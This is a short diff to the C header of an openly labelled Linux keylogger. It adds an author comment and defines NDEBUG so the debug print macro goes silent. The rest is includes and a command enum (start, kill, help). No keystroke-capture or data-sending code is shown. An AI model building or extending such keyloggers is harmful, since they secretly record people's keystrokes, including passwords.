@@ -1,3 +1,7 @@
+/*
+  linux keyloggger
+  @author Liu Mohan
+*/
 #ifndef __KEYLOGGER_H
 #define __KEYLOGGER_H
 #include <stdio.h>
@@ -10,7 +14,13 @@
 #include <fcntl.h>
 #include <linux/input.h>
 
+#define NDEBUG
+
+#ifndef NDEBUG
 #define INFO(...) printf(__VA_ARGS__)
+#else
+#define INFO(...)
+#endif
 #define UK "[Unknown]"
 
 enum ops{NONE, START, KILL, HELP};
